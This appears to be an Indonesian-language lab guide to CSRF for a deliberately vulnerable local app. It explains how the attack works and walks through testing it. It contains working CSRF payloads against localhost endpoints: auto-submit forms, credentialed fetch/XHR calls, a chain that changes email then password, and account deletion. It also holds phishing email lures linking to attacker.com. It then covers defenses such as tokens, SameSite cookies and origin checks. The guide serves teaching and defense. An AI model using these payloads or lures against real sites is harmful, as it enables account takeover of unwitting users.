# 🎯 CSRF Attack Guide

File ini berisi penjelasan lengkap dan cara testing CSRF vulnerability.

## Apa itu CSRF?

**Cross-Site Request Forgery (CSRF)** adalah serangan yang memaksa user yang sudah authenticated untuk mengeksekusi aksi yang tidak diinginkan pada aplikasi web tempat mereka sedang login.

## Cara Kerja CSRF Attack

1. **Korban login** ke aplikasi vulnerable (localhost:3000)
2. Browser menyimpan **cookie session** korban
3. **Attacker** membuat halaman web berbahaya
4. Attacker **mengirim link** ke korban (via email, chat, social media)
5. Korban **membuka link** attacker
6. Browser **otomatis mengirim cookie** ke aplikasi vulnerable
7. Server **tidak bisa membedakan** request legitimate vs malicious
8. **Aksi berbahaya dieksekusi** tanpa sepengetahuan korban

## Testing CSRF di Aplikasi Ini

### Langkah 1: Login sebagai Korban
1. Buka browser dan akses `http://localhost:5173`
2. Login dengan:
   - Username: `korban`
   - Password: `123456`
3. Lihat email saat ini: `korban@target.com`

### Langkah 2: Buka Attacker Page
1. Buka file `attacker-csrf.html` di browser
2. Halaman akan otomatis mengirim request ke `/change-email`
3. Tunggu 2 detik untuk simulasi loading

### Langkah 3: Verifikasi Attack
1. Kembali ke aplikasi (localhost:5173)
2. Refresh halaman
3. Email sudah berubah menjadi `hacker@evil.com` 🚨

## Membuat CSRF Attack Custom

### Contoh 1: Simple Form Auto-Submit
```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
    <form action="http://localhost:3000/change-email" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
    </form>
</body>
</html>
```

### Contoh 2: JavaScript Fetch
```html
<script>
fetch('http://localhost:3000/change-email', {
    method: 'POST',
    credentials: 'include', // Include cookies
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        email: 'pwned@hacker.com'
    })
});
</script>
```

### Contoh 3: Hidden Image
```html
<img src="http://localhost:3000/change-email?email=hacker@evil.com" style="display:none">
```
*Note: Ini hanya work untuk GET request, tapi endpoint kita menggunakan POST*

### Contoh 4: CSRF via XMLHttpRequest
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://localhost:3000/change-email', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({email: 'evil@hacker.com'}));
</script>
```

## Skenario Attack Realistis

### Scenario 1: Email Phishing
```
Subject: 🎁 Congratulations! You Won $1000!

Dear User,

You've been selected to receive $1000!
Click here to claim: http://attacker.com/claim.html

Best regards,
Totally Legitimate Company
```

File `claim.html` berisi CSRF payload yang mengubah email korban.

### Scenario 2: Malicious Advertisement
Attacker membeli ad space di website populer, ad tersebut berisi iframe dengan CSRF payload.

### Scenario 3: Social Engineering
```
"Hey! Check out this funny video I made: http://attacker.com/video.html"
```

## Advanced CSRF Techniques

### 1. CSRF dengan JSON
```javascript
// Jika server hanya accept JSON
fetch('http://localhost:3000/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        email: 'pwned@evil.com'
    })
});
```

### 2. CSRF Chain Attack
```javascript
// Ubah email dulu, lalu ubah password
fetch('http://localhost:3000/change-email', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({email: 'hacker@evil.com'})
}).then(() => {
    return fetch('http://localhost:3000/change-password', {
        method: 'POST',
        credentials: 'include',
        body: JSON.stringify({password: 'hacked123'})
    });
});
```

### 3. CSRF untuk Delete Account
```html
<form action="http://localhost:3000/delete-account" method="POST">
    <input type="hidden" name="confirm" value="yes">
</form>
<script>document.forms[0].submit();</script>
```

## Impact CSRF Attack

- ✅ Ubah email user
- ✅ Ubah password
- ✅ Transfer uang (banking apps)
- ✅ Post/delete content
- ✅ Add admin user
- ✅ Change settings
- ✅ Delete account

## Defense Against CSRF

### 1. CSRF Tokens (Best Practice)
```javascript
// Backend generate token
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.get('/form', csrfProtection, (req, res) => {
    res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/change-email', csrfProtection, (req, res) => {
    // Token automatically validated
});
```

```html
<!-- Frontend include token -->
<form method="POST" action="/change-email">
    <input type="hidden" name="_csrf" value="{{csrfToken}}">
    <input type="email" name="email">
    <button type="submit">Change Email</button>
</form>
```

### 2. SameSite Cookies
```javascript
res.cookie('session', token, {
    httpOnly: true,
    sameSite: 'strict' // atau 'lax'
});
```

**SameSite Options:**
- `strict`: Cookie tidak dikirim untuk cross-site requests
- `lax`: Cookie dikirim untuk top-level navigation (GET)
- `none`: Cookie selalu dikirim (VULNERABLE)

### 3. Validate Origin/Referer Header
```javascript
app.post('/change-email', (req, res) => {
    const origin = req.get('origin');
    const referer = req.get('referer');
    
    if (origin !== 'http://localhost:5173') {
        return res.status(403).json({ error: 'Forbidden' });
    }
    
    // Process request
});
```

### 4. Double Submit Cookie
```javascript
// Set CSRF cookie
res.cookie('csrf-token', randomToken);

// Validate request
app.post('/change-email', (req, res) => {
    const cookieToken = req.cookies['csrf-token'];
    const headerToken = req.headers['x-csrf-token'];
    
    if (cookieToken !== headerToken) {
        return res.status(403).json({ error: 'Invalid CSRF token' });
    }
});
```

### 5. Re-authentication for Sensitive Actions
```javascript
app.post('/change-email', (req, res) => {
    const { email, password } = req.body;
    
    // Require password confirmation
    if (!verifyPassword(user, password)) {
        return res.status(401).json({ error: 'Invalid password' });
    }
    
    // Update email
});
```

## Testing Tools

### 1. Burp Suite
- Intercept requests
- Generate CSRF PoC
- Test CSRF defenses

### 2. OWASP ZAP
- Automated CSRF detection
- Generate attack payloads

### 3. Manual Testing
- Browser DevTools
- Create custom HTML pages
- Test dengan multiple browsers

## Checklist Security

- [ ] Implement CSRF tokens untuk semua state-changing operations
- [ ] Set `SameSite=Strict` atau `Lax` untuk cookies
- [ ] Validate `Origin` dan `Referer` headers
- [ ] Use `HttpOnly` flag untuk session cookies
- [ ] Require re-authentication untuk sensitive actions
- [ ] Implement rate limiting
- [ ] Log suspicious activities

## ⚠️ Legal Warning

CSRF testing harus dilakukan HANYA pada:
- Aplikasi yang Anda miliki
- Aplikasi dengan written permission
- Controlled lab environment

Melakukan CSRF attack tanpa izin adalah **ILEGAL** dan dapat dikenakan sanksi hukum.

## Resources

- [OWASP CSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger CSRF Tutorial](https://portswigger.net/web-security/csrf)
- [MDN SameSite Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)

---

**Happy (Ethical) Hacking! 🔒**
